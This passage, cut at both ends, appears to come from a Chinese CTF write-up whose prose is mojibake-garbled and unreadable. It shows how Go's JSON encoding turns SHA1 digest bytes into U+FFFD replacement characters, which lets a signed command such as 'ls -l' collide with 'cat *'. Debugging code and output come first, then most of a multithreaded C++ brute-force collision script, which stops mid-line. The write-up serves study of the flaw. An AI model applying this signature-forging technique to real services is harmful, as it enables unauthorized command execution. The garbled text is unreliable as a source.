index.phpï¼ŒåŠ ä¸€ä¸ª<code>var_dump($d);</code>ï¼Œå†æ”¹ä¸€ä¸‹ goï¼Œè¿”å›ä¸€ä¸‹ php çš„ç»“æœï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Fprintln(w,<span class="keyword">string</span>(body))</span><br></pre></td></tr></table></figure><p>ç°åœ¨è®©ç¨‹åºç­¾åï¼Œè¿”å›ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string(38) &quot;ï¿½ï¿½.ï¿½ï¿½ï¿½?-ï¿½KCï¿½ï¿½@ï¿½&quot;</span><br><span class="line">&quot;K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\&#x2F;u1\&#x2F;+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\&#x2F;\&#x2F;h6I&#x3D;&quot;</span><br><span class="line">oops, hsm is jsonless?</span><br></pre></td></tr></table></figure><p>$d ç«Ÿç„¶æ˜¯é•¿åº¦ä¸º 38 çš„å­—ç¬¦ä¸²ï¼Œçœ‹æ¥æœç„¶æ˜¯è¿™é‡Œç¼–ç æœ‰é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹æ¯ä¸ªæ­¥éª¤çš„ç»“æœï¼Œå…ˆçœ‹ä¸€ä¸‹ go é‡Œ jsonç¼–ç åçš„ sha1 ç»“æœæ˜¯ä»€ä¹ˆï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/sha1&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">msg := <span class="string">&quot;172.17.0.1|ls -l&quot;</span></span><br><span class="line">digest := sha1.Sum([]<span class="keyword">byte</span>(msg))</span><br><span class="line"></span><br><span class="line">b := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">json.NewEncoder(b).Encode(<span class="keyword">string</span>(digest[:]))</span><br><span class="line">fmt.Print(<span class="keyword">string</span>(b.Bytes()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\u000e\t\u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd&quot;</span><br></pre></td></tr></table></figure><p>å’Œæ­£å¸¸çš„sha1çš„ç»“æœæ¥æ¯”è¾ƒä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.16 (default, Sep  2 2019, 11:59:44)</span><br><span class="line">[GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="string">&quot;\u000e\t\u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd&quot;</span></span><br><span class="line"><span class="string">&#x27;\\u000e\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd&#x27;</span></span><br><span class="line">&gt;&gt;&gt; from hashlib import *</span><br><span class="line">&gt;&gt;&gt; sha1(<span class="string">&#x27;172.17.0.1|ls -l&#x27;</span>).digest()</span><br><span class="line"><span class="string">&#x27;\x0e\t\x1d\xbd\x12\x90.\xca\xf0\xd9?-\x98KC\xeb\x05\xa1@\xd1&#x27;</span></span><br></pre></td></tr></table></figure><p>ç”±äº go çš„ json ç¼–ç ï¼Œå¾ˆå¤šä¸å¯è§å­—ç¬¦éƒ½è¢«è½¬ä¸ºäº† <code>U+fffd</code>ï¼Œä¸¢å¤±äº†å¾ˆå¤šä¿¡æ¯ã€‚</p><p>å†ç»è¿‡ php æ¥å£çš„æ¥æ”¶ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$d = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), JSON_THROW_ON_ERROR);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>));</span><br><span class="line">var_dump($d);</span><br><span class="line">var_dump(bin2hex($d));</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string(89) &quot;&quot;\u000e\t\u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd&quot;</span><br><span class="line">&quot;</span><br><span class="line">string(38) &quot;ï¿½ï¿½.ï¿½ï¿½ï¿½?-ï¿½KCï¿½ï¿½@ï¿½&quot;</span><br><span class="line">string(76) &quot;0e091defbfbd12efbfbd2eefbfbdefbfbdefbfbd3f2defbfbd4b43efbfbd05efbfbd40efbfbd&quot;</span><br><span class="line">&quot;K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\&#x2F;u1\&#x2F;+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\&#x2F;\&#x2F;h6I&#x3D;&quot;</span><br><span class="line">oops, hsm is jsonless?</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>U+fffd</code>å˜æˆäº†<code>\xef\xbf\xbd</code>ã€‚æ‰€ä»¥ç”±äº go çš„ json ç¼–ç é—®é¢˜ï¼Œä¸¢å¤±äº†å¾ˆå¤šä¿¡æ¯ï¼Œé€ æˆäº† md5 å‰çš„æ•°æ®æœ‰å¾ˆå¤šç›¸åŒå­—ç¬¦ã€‚å½“æ—¶åšé¢˜æ—¶å¾€ä¸‹å¹¶æ²¡æœ‰ç»†æƒ³ï¼Œå¾—åˆ° n åæ€»æ˜¯æƒ³æ„é€ å‡ºä»»æ„å‘½ä»¤çš„ç­¾åï¼Œä¹Ÿå¾ˆç–‘æƒ‘å¦‚æœæ„é€ å‡ºå²‚ä¸æ˜¯è¿™ç§ç­¾åå°±ä¸å®‰å…¨äº†ï¼Ÿå…¶å®æ˜¯æ— æ³•å¾—åˆ°çš„ã€‚</p><p>æ­£è§£æ˜¯ go çš„è¿™ç§é—®é¢˜ ï¼Œä¸ºç¢°æ’åˆ›é€ äº†æ¡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ç¢°æ’å‡ºåœ¨è¿™ç§ç¼–ç æƒ…å†µä¸‹ä¸ <code>ls -l</code>æœ‰ç›¸åŒç»“æœçš„<code>cat *</code> æ­¤ç±»å‘½ä»¤ã€‚ä½†æ˜¯é—®é¢˜æ˜¯æˆ‘ä»¬éœ€è¦éå¸¸å¤§é‡ ip æ¥æä¾›ç¢°æ’çš„æ•°æ®ã€‚</p><p>å¯ä»¥å‘ç°ï¼Œgo å– ip çš„æ—¶å€™ï¼Œæ˜¯å…ˆç”¨<code>net.ParseIP</code>è§£æäº† ipï¼Œæˆ‘ä»¬åœ¨ ip æ¯ä¸ªæ•°å­—å‰é¢åŠ  0 ï¼Œè§£æåè¿˜æ˜¯åŸæ¥çš„ ip ç»“æœï¼Œæ¯ä¸ªæ•°å­—æœ€å¤šæ·»åŠ  256 ä¸ª 0ï¼Œå››ä¸ªæ•°å­—å°±å·²ç»äº§ç”Ÿäº† <code>2^32</code>ç§ä¸åŒçš„ç»„åˆï¼Œè¶³ä»¥ç¢°æ’å‡º <code>ls -l</code>ä¸ <code>cat *</code>ä¹‹é—´çš„å†²çªã€‚</p><p>å®˜æ–¹é¢˜è§£çš„ c++ ç¢°æ’è„šæœ¬ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/sha.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> num_threads = <span class="built_in">std</span>::thread::hardware_concurrency();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">hash</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> <span class="keyword">const</span>&amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SHA_CTX ctx;</span><br><span class="line">    <span class="keyword">if</span> (!SHA1_Init(&amp;ctx)) <span class="keyword">throw</span>;</span><br><span class="line">    <span class="keyword">if</span> (!SHA1_Update(&amp;ctx, s.data(), s.length())) <span class="keyword">throw</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">d</span><span class="params">(SHA_DIGEST_LENGTH, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!SHA1_Final((<span class="keyword">uint8_t</span> *) &amp;d[<span class="number">0</span>], &amp;ctx)) <span class="keyword">throw</span>;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">std</span>::u32string <span class="title">kapot</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> <span class="keyword">const</span>&amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::u32string <span class="title">r</span><span class="params">(s.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">size_t</span> o = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s.length(); ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> T = [](<span class="keyword">uint8_t</span> c) &#123;</span><br><span class="line">            <span class="keyword">return</span> (c &lt; <span class="number">0x80</span>)         ? <span class="number">1</span>   <span class="comment">/* ASCII */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xc0</span>) == <span class="number">0x80</span> ? <span class="number">0</span>   <span class="comment">/* continuation */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xe0</span>) == <span class="number">0xc0</span> ? <span class="number">2</span>   <span class="comment">/* 2-byte chunk */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xf0</span>) == <span class="number">0xe0</span> ? <span class="number">3</span>   <span class="comment">/* 3-byte chunk */</span></span><br><span class="line">                 : (c &amp; <span class="number">0xf8</span>) == <span class="number">0xf0</span> ? <span class="number">4</span>   <span class="comment">/* 4-byte chunk */</span></span><br><span class="line">                 : <span class="number">-1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint32_t</span> c = s[i++];</span><br><span class="line">        <span class="keyword">auto</span> cont = [&amp;]() &#123; c = (c &lt;&lt; <span class="number">6</span>) | (s[i++] &amp; <span class="number">0x3f</span>); &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (T(c)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">case</span>  <span class="number">0</span>:</span><br><span class="line">        invalid: c = <span class="number">0xfffd</span>; <span class="comment">/* fall through */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">1</span>:</span><br><span class="line">        valid:   r[o++] = c; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">2</span>:</span><br><span class="line">                 <span class="keyword">if</span> (c &amp;= <span class="number">0x1f</span>, i+<span class="number">0</span> &gt;= s.size() || T(s[i+<span class="number">0</span>]))</span><br><span class="line">                     <span class="keyword">goto</span> invalid;</span><br><span class="line">                 <span class="keyword">goto</span> one;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">3</span>:</span><br><span class="line">                 <span class="keyword">if</span> (c &amp;= <span class="number">0x1f</span>, i+<span class="number">1</span> &gt;= s.size() || T(s[i+<span class="number">0</span>]) || T(s[i+<span class="number">1</span>]))</span><br><span class="line">                     <span class="keyword">goto</span> invalid;</span><br><span class="line">                 <span class="keyword">goto</span> two;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span>  <span class="number">4</span>:</span><br><span class="line">                 <span class="keyword">if</span> (c &amp;= <span class="number">0x1f</span>, i+<span class="number">2</span> &gt;= s.size() || T(s[i+<span class="number">0</span>]) || T(s[i+<span class="number">1</span>]) || T(s[i+<span class="number">2</span>]))</span><br><span class="line">                     <span class="keyword">goto</span> invalid;</span><br><span class="line">                 cont();</span><br><span class="line">        two:     cont();</span><br><span class="line">        one:     cont();</span><br><span class="line">                 <span class="keyword">goto</span> valid;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r.resize(o);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::atomic&lt;<span class="keyword">uint64_t</span>&gt; hcount = <span class="number">0</span>, kcount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="built_in">std</span>::u32string, <span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="keyword">tab_t</span>;</span><br><span class="line"><span class="keyword">tab_t</span> tab0, tab1;</span><br><span class="line"><span class="built_in">std</span>::mutex mtx;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">uint8_t</span>,4&gt; ip;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> cmd0, cmd1;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">stuffer_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">size_t</span>,4&gt; cnts;</span><br><span class="line">        <span class="keyword">size_t</span> step;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> cmd;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">stuffer_t</span>(<span class="keyword">size_t</span> t, <span class="keyword">size_t</span> s, <span class="built_in">std</span>::<span class="built_in">string</span> c) : cnts&#123;t&#125;, step(s), cmd(c) &#123;&#125;</span><br><span class="line">        <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">//XXX this is by far not the most efficient way of doing this, but yeah</span></span><br><span class="line">            <span class="keyword">if</span> (++cnts[<span class="number">3</span>] &gt;= cnts[<span class="number">0</span>]) &#123;</span><br><span class="line">                cnts[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (++cnts[<span class="number">2</span>] &gt;= cnts[<span class="number">0</span>]) &#123;</span><br><span class="line">                    cnts[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span> (++cnts[<span class="number">1</span>] &gt;= cnts[<span class="number">0</span>]) &#123;</span><br><span class="line">                        cnts[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                        cnts[<span class="number">0</span>] += step;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">stringstream</span> o;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">                o &lt;&lt; (i ? <span class="string">&quot;.&quot;</span> : <span class="string">&quot;&quot;</span>)</span><br><span class="line">                  &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>(cnts[i], <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                  &lt;&lt; (<span class="keyword">unsigned</span>) ip[i];</span><br><span class="line">            o &lt;&lt; <span class="string">&quot;|&quot;</span> &lt;&lt; cmd;</span><br><span class="line">            <span class="keyword">return</span> o.str();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">go</span><span class="params">(<span class="keyword">size_t</span> tid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//XXX tid stuff is a hack, but YOLO</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> one = tid &amp; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">stuffer_t</span> <span class="title">next</span><span class="params">(tid &gt;&gt; <span class="number">1</span>, (num_threads + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>, one ? cmd1 : cmd0)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">tab_t</span>&amp; mytab = one ? tab1 : tab0;</span><br><span class="line">    <span class="keyword">tab_t</span>&amp; thtab = one ? tab0 : tab1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> myhcount = <span class="number">0</span>, mykcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span> r = next();</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            ++myhcount;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> h = hash(r);</span><br><span class="line">            <span class="keyword">if</span> ((h.size()+<span class="number">3</span>)/<span class="number">4</span> &lt; (<span class="keyword">size_t</span>) <span class="built_in">std</span>::count_if(h.begin(), h.end(),</span><br><span class="line">                                            [](<span class="keyword">unsigned</span> <span class="keyword">char</span> c) &#123; <span class="keyword">return</span> c &lt; <span class="number">0x80</span>; &#125;))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            ++mykcount;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> k = kapot(h);</span><br><span class="line">            <span class="keyword">if</span> (k.size() &gt; <span class="number">3</span> + (<span class="keyword">size_t</span>) <span class="built_in">std</span>::count(k.begin(), k.end(), <span class="number">0xfffd</span>))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="built_in">std</span>::lock_guard&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lck</span><span class="params">(mtx)</span></span>;</span><br><span class="line"></span><br><span class="line">            hcount += myhcount, myhcount = <span class="number">0</span>;</span><br><span class="line">            kcount += mykcount, mykcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (thtab.find(k) != thtab.end()) &#123;</span><br><span class="line"></span><br><span class="line">                mytab[k] = r;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\r\x1b[K&quot;</span></span><br><span class="line">                          &lt;&lt; <span class="string">&quot;\x1b[32m&quot;</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; tab0[k] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span></span><br><span class="line">                          &lt;&lt; tab1[k] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\x1b[0m&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="built_in">std</span>::hex;</span><br><span class="line">                <span class="keyword">bool</span> first = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span 